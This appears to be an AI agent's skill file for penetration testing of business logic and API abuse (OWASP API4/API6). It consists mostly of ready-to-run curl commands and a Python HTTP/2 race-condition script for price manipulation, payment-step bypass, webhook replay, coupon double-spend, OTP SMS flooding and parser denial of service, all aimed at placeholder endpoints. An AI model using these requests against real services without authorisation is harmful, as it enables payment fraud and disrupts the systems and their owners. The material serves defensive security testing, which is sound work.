---
name: business-logic
description: Business logic and flow abuse testing. Maps to OWASP API4 and API6. Use for payment flows, registration, rate limits, and race conditions.
allowed-tools: Read, Grep, Glob, Bash
---
# Business Logic Testing Skill (API4 + API6)

## When to Use
- Testing e-commerce, payment, or financial APIs
- Testing user registration, verification, or onboarding flows
- Testing coupon/discount/referral systems
- Testing any multi-step workflow
- OWASP API4 (Unrestricted Resource Consumption) or API6 (Unrestricted Access to Sensitive Business Flows)

## Price/Amount Manipulation
    # Test negative quantities
    curl -X POST API/cart -H "Content-Type: application/json" \
      -d '{"item_id": 1, "quantity": -1, "price": 9.99}'

    # Test zero amount
    curl -X POST API/payment -d '{"amount": 0}'

    # Test price override in request body
    curl -X POST API/checkout -d '{"item_id": 1, "price": 0.01}'

    # Decimal precision abuse
    curl -X POST API/transfer -d '{"amount": 0.001}'

    # Currency confusion
    curl -X POST API/payment -d '{"amount": 100, "currency": "IDR"}'

    # Integer overflow
    curl -X POST API/transfer -d '{"amount": 2147483648}'

## Workflow Bypass
    # Skip payment step — go directly to order confirmation
    curl -X POST API/orders/confirm -d '{"order_id": "ORD-123"}'

    # Complete steps out of order
    # Normal: step1 -> step2 -> step3
    # Attack: step1 -> step3 (skip step2 validation)
    curl -X POST API/onboarding/step3 -d '{"user_id": "new_user"}'

    # Replay successful response
    # Capture a successful payment response, replay it for a different order
    curl -X POST API/webhook/payment-success -d @captured_response.json

    # Invalid state transitions
    # e.g., move order from "cancelled" back to "processing"
    curl -X PATCH API/orders/ORD-123 -d '{"status": "processing"}'

## Race Conditions
### HTTP/2 Single-Packet Attack (most effective)
    # Use turbo-intruder or custom Python with h2
    # Send 20-30 requests in one TCP packet to hit the same resource simultaneously
    python3 -c "
    import httpx, asyncio
    async def race():
        async with httpx.AsyncClient(http2=True) as c:
            tasks = [c.post('TARGET/api/redeem', json={'code': 'DISCOUNT50'}, headers={'Authorization': 'Bearer TOKEN'}) for _ in range(30)]
            results = await asyncio.gather(*tasks)
            for r in results: print(r.status_code, r.text[:100])
    asyncio.run(race())
    "

### HTTP/1.1 Last-Byte Sync
    # Send all requests minus final byte, then send all final bytes simultaneously
    # Useful when HTTP/2 is not available

### High-Value Race Targets
- Coupon/promo code redemption (double-spend)
- Balance transfers (transfer more than available)
- OTP/2FA verification (bypass rate limit)
- Account creation with referral bonus
- Vote/like systems (inflate counts)
- Inventory purchase (buy more than in stock)

## Coupon/Discount Abuse
    # Apply same coupon multiple times
    for i in $(seq 1 10); do
      curl -X POST API/cart/apply-coupon -d '{"code": "SAVE50"}' &
    done; wait

    # Apply multiple different coupons (stacking)
    curl -X POST API/cart/apply-coupon -d '{"code": "SAVE10"}'
    curl -X POST API/cart/apply-coupon -d '{"code": "WELCOME20"}'
    curl -X POST API/cart/apply-coupon -d '{"code": "FREESHIP"}'

    # Expired coupon reuse
    curl -X POST API/cart/apply-coupon -d '{"code": "EXPIRED_CODE"}'

## Pagination & Resource Exhaustion (API4)
    # Excessive page size
    curl "API/users?page_size=999999"
    curl "API/search?limit=100000&offset=0"

    # Deep pagination
    curl "API/data?page=99999999"

    # SMS/email cost amplification
    for i in $(seq 1 100); do
      curl -X POST API/auth/send-otp -d '{"phone": "+1234567890"}'
    done

    # Nested JSON depth (parser DoS)
    python3 -c "print('{\"a\":' * 1000 + '1' + '}' * 1000)" | \
      curl -X POST API/endpoint -H "Content-Type: application/json" -d @-

    # Large file upload
    dd if=/dev/zero bs=1M count=500 | curl -X POST API/upload -F "file=@-;filename=large.bin"

## Referral/Invite Abuse
    # Self-referral
    curl -X POST API/referral -d '{"referrer": "USER_A", "referred": "USER_A"}'

    # Referral loop (A refers B, B refers A)
    curl -X POST API/referral -d '{"referrer": "A", "referred": "B"}'
    curl -X POST API/referral -d '{"referrer": "B", "referred": "A"}'

## Output
For each finding: business flow affected, manipulation technique, financial/business impact, reproduction steps, severity.

## Validate & Promote

Findings from this skill are born `theoretical` (see the validation layer in the repo-root `CLAUDE.md`). They do NOT enter a report or external submission until promoted to `confirmed` with `scripts/validate-finding.sh`, after the independent check below.

- **Independent check for this class:** Reproduce the abuse END-STATE (negative price persisted, double-spend completed, step skipped), not just an accepted request. Re-read state to prove the effect stuck.
- Only `confirmed` findings ship. `validated` = reproduced but not independently confirmed.

```bash
bash scripts/validate-finding.sh --project-dir "$PROJECT_DIR" --agent specter \
  --id SPE-NNN --state confirmed --method manual-repro \
  --negative-control "<what you proved, and the control result>" --by specter
```
